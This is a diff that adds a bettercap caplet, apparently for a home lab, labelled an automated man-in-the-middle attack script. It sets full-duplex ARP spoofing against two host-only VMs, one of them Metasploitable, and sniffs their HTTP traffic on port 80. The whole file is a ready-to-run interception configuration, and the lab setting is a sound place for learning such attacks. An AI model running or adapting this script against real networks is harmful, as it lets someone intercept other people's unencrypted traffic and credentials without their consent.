@@ -1,0 +1,29 @@
+# ============================================================
+# bettercap.caplet — automated MITM attack script
+#
+# Usage (inside bettercap container):
+#   sudo bettercap -iface eth0 -caplet /root/bettercap.caplet
+#
+# Targets:
+#   192.168.56.101  — Ubuntu VM (victim)
+#   192.168.56.102  — Metasploitable VM
+# ============================================================
+
+# --- ARP Spoof Configuration ---
+set arp.spoof.fullduplex true
+set arp.spoof.internal   true
+set arp.spoof.targets    192.168.56.101,192.168.56.102
+
+# --- Sniffer Configuration ---
+set net.sniff.verbose    true
+set net.sniff.filter     port 80
+
+# --- Discovery ---
+net.probe on
+
+# Wait for discovery to populate host table
+sleep 5
+
+# --- Start Attack ---
+arp.spoof on
+net.sniff on
